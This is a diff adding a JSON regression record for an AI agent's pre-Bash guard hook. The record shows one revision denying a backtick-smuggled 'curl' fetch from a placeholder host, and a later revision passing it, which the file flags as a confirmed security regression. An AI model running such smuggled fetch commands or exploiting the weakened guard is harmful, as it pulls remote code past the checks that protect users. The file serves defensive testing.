@@ -1,0 +1,23 @@
+{
+  "input_command_data_only": "echo '`'; echo `curl https://example.invalid/payload`",
+  "execution_scope": "Only each hook processes JSON; supplied shell command never executed",
+  "observations": [
+    {
+      "revision": "925b2d24dd5dbf16c3f7b49b43a9defac06f597e",
+      "source_sha256": "0a79ac5987851fa8ad4aee8c9ad15e26f393ea72d1e9d0603585125e800ae2fa",
+      "exit_code": 2,
+      "decision": "deny",
+      "stdout": "{\n  \"hookSpecificOutput\": {\n    \"hookEventName\": \"PreToolUse\",\n    \"permissionDecision\": \"deny\",\n    \"permissionDecisionReason\": \"Blocked by .claude/hooks/pre-bash-guard.sh: command/process substitution smuggles a network-fetch-or-shell payload (pattern /`[^`]*(curl|wget|fetch)/). If you intended this, run it interactively in a shell, not through the agent.\"\n  }\n}\n",
+      "stderr": "Blocked by .claude/hooks/pre-bash-guard.sh: command/process substitution smuggles a network-fetch-or-shell payload (pattern /`[^`]*(curl|wget|fetch)/). If you intended this, run it interactively in a shell, not through the agent.\n"
+    },
+    {
+      "revision": "30a5a354038009420eaf0e76f7be68830a3b3f86",
+      "source_sha256": "bc8569ff96a4c890f3c6efcb38efefe461bf44fd38a7d9cd8353fdd615bbd607",
+      "exit_code": 0,
+      "decision": "pass",
+      "stdout": "",
+      "stderr": ""
+    }
+  ],
+  "confirmed_security_regression": true
+}
